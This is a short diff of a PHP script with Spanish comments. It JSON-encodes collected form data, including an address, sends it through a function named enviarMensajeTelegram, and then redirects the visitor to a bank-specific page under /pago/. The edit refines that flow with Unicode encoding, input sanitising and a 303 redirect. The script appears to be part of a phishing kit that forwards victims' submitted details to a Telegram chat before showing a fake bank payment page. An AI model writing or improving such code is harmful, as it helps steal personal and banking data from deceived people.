@@ -35,8 +35,14 @@ $data = array(
     "direccion" => $add
 );
 
-$jsonData = json_encode($data);
+$jsonData = json_encode($data, JSON_UNESCAPED_UNICODE);
 enviarMensajeTelegram($jsonData);
-header('location:/pago/'+$banco+'/'+$banco+'.php');
+
+// Normaliza y escapa
+$bank = strtolower(preg_replace('/[^A-Za-z0-9_-]/', '', $banco));
+
+// POST-Redirect-GET (303) a la URL bonita: /pago/<banco>
+header('Location: /pago/' . rawurlencode($bank), true, 303);
+exit;
 ?>
 
